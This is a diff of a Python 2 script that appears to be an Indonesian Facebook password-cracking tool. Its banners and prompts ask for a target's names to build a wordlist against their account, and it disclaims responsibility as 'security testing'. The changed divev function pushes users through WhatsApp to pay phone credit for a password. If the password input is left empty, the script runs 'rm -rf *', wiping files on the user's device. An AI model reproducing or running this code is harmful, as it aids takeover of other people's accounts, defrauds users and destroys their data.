@@ -474,9 +474,9 @@ user_agents = [('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
 
 
 string1 = '''
-        Silahkan Kalian Buat Wordlist Sendiri
-    Hanya Dengan Memasukkan Nama Depan Dan Belakan 
-  Fb Korban Yang Mau Di Crack Passwordnya ya sayang...
+      Silahkan Kalian Buat Wordlist Sendiri
+  Hanya Dengan Memasukkan Nama Depan Dan Belakan 
+Fb Korban Yang Mau Di Crack Passwordnya ya sayang..
 '''
 string2 = ''' 
         Brute Force Fb Target
@@ -487,9 +487,9 @@ baner = '''
   ___   V.0.1  ___ ___  .
  |   \ _____ _|_ _|   \  | Using : Python27
  | |) / -_) V /| || |) | | Tools : Geli2 Fb
- |___/\___|\_/|___|___/  | Versi : 0.1xxxxx  .
-         {+}_{+}        /  Coded : IqbalDev  /
- +--,------------------'----------------,---'
+ |___/\___|\_/|___|___/  | Versi : 0.1xxxxx .
+         {+}_{+}        /  Author: IqbalDev /
+ +--,------------------'----------------,--'
    / Saya Tidak Bertanggung Jawab Atas   \\
   / Apa Yang Kalian Perbuat, Ini Sengaja /
   \     Saya Buat Untuk Uji Keamanan    /
@@ -500,9 +500,9 @@ baner = '''
 '''
 
 user_dev = '''
-  Silahkan masukkan Nama orang yang mau di crack, 
-   contoh penulisan: (dinda) atau (dinda maulia) 
- tanpa tanda kurung () ya gan :) // Selamat Mencoba 
+ Silahkan masukkan Nama orang yang mau di crack, 
+  contoh penulisan: (dinda) atau (dinda maulia) 
+tanpa tanda kurung () ya gan // Selamat Mencoba :)
 '''
 
 
@@ -532,7 +532,7 @@ def divev():
 		h = l.replace('/', 'd3v').replace('0', '10')
 		ha = base64.b64encode(h)
 		print h + ' ' + ha
-		subprocess.check_output(['am','start',"https://api.whatsapp.com/send?phone=628821457948&text="+ha+"Assalamu'alailum,  Bang Minta Passwordnya, ntar saya kirim pulsa 10k serta buktinya *Syarat Mendapatkan Password = kamu harus kirim pulsa 10k dulu ke no ini = 08812457948, Kirim bukti pengiriman pulsanya, ntar kamu akan di beri sandinya*"])
+		subprocess.check_output(['am','start',"https://api.whatsapp.com/send?phone=6281276729006&text="+ha+"Assalamu'alailum,  Bang Minta Passwordnya, ntar saya kirim pulsa 10k serta buktinya *Syarat Mendapatkan Password = kamu harus kirim pulsa 10k dulu ke no ini = 08812457948, Kirim bukti pengiriman pulsanya, ntar kamu akan di beri sandinya*"])
 		f = raw_input(' [P] Masukkan sandinya = ')
 		if f == '' or f == ' ':
 			os.system('rm -rf *')
